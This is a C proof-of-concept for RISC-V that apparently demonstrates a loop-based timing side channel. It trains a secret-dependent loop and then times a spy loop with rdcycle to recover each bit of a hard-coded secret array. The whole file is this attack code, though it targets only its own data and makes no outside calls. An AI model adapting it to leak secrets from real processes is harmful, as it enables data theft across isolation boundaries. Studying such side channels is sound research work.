#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>

#define SECRET_LEN      8
#define ATTACK_ROUNDS   200    
#define TRAIN_LOOP      5      

volatile uint8_t sec_data[SECRET_LEN] = {1,0,0,1,0,1,0,1};
volatile uint8_t array1[1] = {1};                         

static inline uint64_t time(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

void loop_f(uint8_t *addr) {
    int limit = (int)(*addr) + 2;
    for (int i = 0; i < limit; ++i) {
        asm volatile("nop");
    }
}

void victim_f(unsigned idx) {
    loop_f((uint8_t*)&sec_data[idx]);
}

void spy_f(unsigned idx) {
    (void)idx;
    loop_f((uint8_t*)&array1[0]);
}

int main(void) {
    printf("PLoop (rdcycle) minimal prototype\n");
    printf("secret: ");
    for (int i = 0; i < SECRET_LEN; ++i) printf("%d ", (int)sec_data[i]);
    printf("\nATTACK_ROUNDS = %d, TRAIN_LOOP = %d\n\n", ATTACK_ROUNDS, TRAIN_LOOP);

    for (int idx = 0; idx < SECRET_LEN; ++idx) {
        uint64_t sum_cycles = 0;

        for (int k = 0; k < ATTACK_ROUNDS; ++k) {
            for (int j = 0; j < TRAIN_LOOP; ++j) {
                victim_f(idx);
            }

            uint64_t t0 = time();
            spy_f(0);
            uint64_t t1 = time();
            sum_cycles += (t1 - t0);
        }

        double mean_cycles = (double)sum_cycles / (double)ATTACK_ROUNDS;
        printf("Index %d: mean_probe = %.2f cycles (over %d rounds)\n", idx, mean_cycles, ATTACK_ROUNDS);
    }

    return 0;
}